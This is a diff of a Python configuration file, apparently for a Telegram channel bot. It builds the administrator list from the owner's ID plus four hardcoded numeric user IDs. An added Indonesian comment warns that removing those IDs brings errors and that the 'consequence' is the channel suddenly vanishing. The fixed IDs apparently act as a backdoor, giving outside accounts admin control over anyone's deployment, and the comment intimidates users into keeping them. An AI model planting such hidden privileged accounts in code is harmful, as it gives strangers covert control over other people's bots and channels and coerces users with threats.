@@ -59,10 +59,9 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(844432220)
-ADMINS.append(1250450587)
-ADMINS.append(1750080384)
-ADMINS.append(2102118281)
+# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
+# Spoiler KONSEKUENSI Paling CH nya tiba tiba ilang 🤪
+ADMINS.extend((OWNER_ID, 844432220, 1250450587, 1750080384, 2102118281))
 
 
 LOG_FILE_NAME = "logs.txt"
